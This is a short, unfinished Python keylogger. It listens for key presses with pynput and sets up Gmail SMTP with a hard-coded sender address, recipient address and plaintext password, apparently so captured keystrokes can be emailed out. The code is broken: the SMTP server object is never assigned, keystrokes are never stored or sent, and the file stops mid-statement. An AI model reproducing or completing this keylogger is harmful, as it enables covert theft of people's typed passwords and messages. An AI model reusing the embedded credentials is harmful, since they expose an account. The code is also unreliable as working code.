from pynput.keyboard import Listener
import smtplib

def sendemail():
    sender_email = "tprototype@gmail.com"
    rec_email = "kishmat17@gmail.com"
    password = "cricket17"
    smtplib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(sender_email,password)
    print("login succesful")

sendemail()

def writeoffile(key):
    keydata = str(key)

with Listener(on_press=writeoffile) as l:
